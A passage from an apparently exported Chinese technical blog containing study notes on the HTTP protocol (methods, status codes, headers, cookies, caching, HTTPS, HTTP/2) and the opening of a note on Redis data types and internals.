    <content type="text"><![CDATA[一 、基础概念URIURI 包含 URL 和 URN。 请求和响应报文1. 请求报文 2. 响应报文 二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 HEAD 获取报文首部 和 GET 方法类似，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。 更多 POST 与 GET 的比较请见第九章。 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes] DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。 会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 CONNECT 要求在与代理服务器通信时建立隧道 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。 三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 含义 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝。 404 Not Found 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP 首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。 各种首部字段及其含义如下（不需要全记，仅供查阅）： 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP 方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用连接管理 1. 短连接与长连接当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。 长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close； 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 Connection : Keep-Alive。 2. 流水线默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。 流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。 CookieHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。 Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。 1. 用途 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 2. 创建过程服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. 作用域Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。 Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配： /docs /docs/Web/ /docs/Web/HTTP 5. JavaScript通过 document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。 123document.cookie = "yummy_cookie=choco";document.cookie = "tasty_cookie=strawberry";console.log(document.cookie); 6. HttpOnly标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 7. Secure标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。 8. Session除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。 Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。 使用 Session 维护用户登录状态的过程如下： 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。 9. 浏览器禁用 Cookie此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。 10. Cookie 与 Session 选择 Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。 缓存1. 优点 缓解服务器压力； 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存在地理位置上也有可能比源服务器来得近，例如浏览器缓存。 2. 实现方法 让代理服务器进行缓存； 让客户端浏览器进行缓存。 3. Cache-ControlHTTP/1.1 通过 Cache-Control 首部字段来控制缓存。 3.1 禁止进行缓存 no-store 指令规定不能对请求或响应的任何一部分进行缓存。 1Cache-Control: no-store 3.2 强制确认缓存 no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。 1Cache-Control: no-cache 3.3 私有缓存和公共缓存 private 指令规定了将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。 1Cache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户所使用，一般存储在代理服务器中。 1Cache-Control: public 3.4 缓存过期机制 max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 max-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。 1Cache-Control: max-age=31536000 Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。 1Expires: Wed, 04 Jul 2012 08:26:05 GMT 在 HTTP/1.1 中，会优先处理 max-age 指令； 在 HTTP/1.0 中，max-age 指令会被忽略掉。 4. 缓存验证需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。 1ETag: "82e22293907ce725faf67773957acd12" 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。 1If-None-Match: "82e22293907ce725faf67773957acd12" Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应。 1Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT 1If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 1. 类型1.1 服务端驱动型 客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。 它存在以下问题： 服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）； 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。 1.2 代理驱动型 服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。 2. Vary1Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。 例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。 内容编码内容编码将实体主体进行压缩，从而减少传输的数据量。 常用的内容编码有：gzip、compress、deflate、identity。 浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应的 Vary 首部至少要包含 Content-Encoding。 范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。 1. Range在请求报文中添加 Range 首部字段指定请求的范围。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 2. Accept-Ranges响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。 1Accept-Ranges: bytes 3. 响应状态码 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。 分块传输编码Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。 多部分对象集合一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 虚拟主机HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。 通信数据转发1. 代理代理服务器接受客户端的请求，并且转发给其它服务器。 使用代理的主要目的是： 缓存 负载均衡 网络访问控制 访问日志记录 代理服务器分为正向代理和反向代理两种： 用户察觉得到正向代理的存在。 而反向代理一般位于内部网络中，用户察觉不到。 2. 网关与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。 3. 隧道使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。 六、HTTPSHTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。 通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。 加密1. 对称密钥加密对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。 优点：运算速度快； 缺点：无法安全地将密钥传输给通信方。 2.非对称密钥加密非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。 公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。 优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。 3. HTTPS 采用的加密方式HTTPS 采用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证传输过程的安全性，之后使用对称密钥加密进行通信来保证通信过程的效率。（下图中的 Session Key 就是对称密钥） 认证通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。 服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。 完整性保护SSL 提供报文摘要功能来进行完整性保护。 HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。 HTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。 HTTPS 的缺点 因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高额费用。 七、HTTP/2.0HTTP/1.x 缺陷HTTP/1.x 实现简单是以牺牲性能为代价的： 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。 在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 服务端推送HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。 HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。 不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。 八、HTTP/1.1 新特性详细内容请见上文 默认是长连接 支持流水线 支持同时打开多个 TCP 连接 支持虚拟主机 新增状态码 100 支持分块传输编码 新增缓存处理指令 max-age 九、GET 和 POST 比较作用GET 用于获取资源，而 POST 用于传输实体主体。 参数GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。 因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 中文 会转换为 %E4%B8%AD%E6%96%87，而空格会转换为 %20。POST 参数支持标准字符集。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 安全安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 幂等性幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。 所有的安全方法也都是幂等的。 在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。 GET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1 -&gt; Adds a 1nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便不同的请求接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 可缓存如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>HTTP协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2018%2F09%2F05%2FRedis%2F</url>
    <content type="text"><![CDATA[一、概述Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。 键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。 Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。 二、数据类型 数据类型 可以存储的值 操作 STRING 字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作 LIST 列表 从两端压入或者弹出元素 对单个或者多个元素 进行修剪，只保留一个范围内的元素 SET 无序集合 添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素 HASH 包含键值对的无序散列表 添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在 ZSET 有序集合 添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名 What Redis data structures look like STRING 12345678&gt; set hello worldOK&gt; get hello"world"&gt; del hello(integer) 1&gt; get hello(nil) LIST 123456789101112131415161718192021&gt; rpush list-key item(integer) 1&gt; rpush list-key item2(integer) 2&gt; rpush list-key item(integer) 3&gt; lrange list-key 0 -11) "item"2) "item2"3) "item"&gt; lindex list-key 1"item2"&gt; lpop list-key"item"&gt; lrange list-key 0 -11) "item2"2) "item" SET 123456789101112131415161718192021222324252627&gt; sadd set-key item(integer) 1&gt; sadd set-key item2(integer) 1&gt; sadd set-key item3(integer) 1&gt; sadd set-key item(integer) 0&gt; smembers set-key1) "item"2) "item2"3) "item3"&gt; sismember set-key item4(integer) 0&gt; sismember set-key item(integer) 1&gt; srem set-key item2(integer) 1&gt; srem set-key item2(integer) 0&gt; smembers set-key1) "item"2) "item3" HASH 123456789101112131415161718192021222324&gt; hset hash-key sub-key1 value1(integer) 1&gt; hset hash-key sub-key2 value2(integer) 1&gt; hset hash-key sub-key1 value1(integer) 0&gt; hgetall hash-key1) "sub-key1"2) "value1"3) "sub-key2"4) "value2"&gt; hdel hash-key sub-key2(integer) 1&gt; hdel hash-key sub-key2(integer) 0&gt; hget hash-key sub-key1"value1"&gt; hgetall hash-key1) "sub-key1"2) "value1" ZSET 12345678910111213141516171819202122232425&gt; zadd zset-key 728 member1(integer) 1&gt; zadd zset-key 982 member0(integer) 1&gt; zadd zset-key 982 member0(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member1"2) "728"3) "member0"4) "982"&gt; zrangebyscore zset-key 0 800 withscores1) "member1"2) "728"&gt; zrem zset-key member1(integer) 1&gt; zrem zset-key member1(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member0"2) "982" 三、数据结构字典dictht 是一个散列表结构，使用拉链法保存哈希冲突。 12345678/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */typedef struct dictht &#123; dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used;&#125; dictht; 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */&#125; dict; rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。 渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。 在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。 采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */int dictRehash(dict *d, int n) &#123; int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- &amp;&amp; d-&gt;ht[0].used != 0) &#123; dictEntry *de, *nextde; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d-&gt;ht[0].size &gt; (unsigned long) d-&gt;rehashidx); while (d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) &#123; d-&gt;rehashidx++; if (--empty_visits == 0) return 1; &#125; de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) &#123; uint64_t h; nextde = de-&gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; d-&gt;ht[0].used--; d-&gt;ht[1].used++; de = nextde; &#125; d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; d-&gt;rehashidx++; &#125; /* Check if we already rehashed the whole table... */ if (d-&gt;ht[0].used == 0) &#123; zfree(d-&gt;ht[0].table); d-&gt;ht[0] = d-&gt;ht[1]; _dictReset(&amp;d-&gt;ht[1]); d-&gt;rehashidx = -1; return 0; &#125; /* More to rehash... */ return 1;&#125; 跳跃表是有序集合的底层实现之一。 跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。 在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。 与红黑树等平衡树相比，跳跃表具有以下优点： 插入速度非常快速，因为不需要进行旋转等操作来维护平衡性； 更容易实现； 支持无锁操作。 四、使用场景计数器可以对 String 进行自增自减运算，从而实现计数器功能。 Redis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。 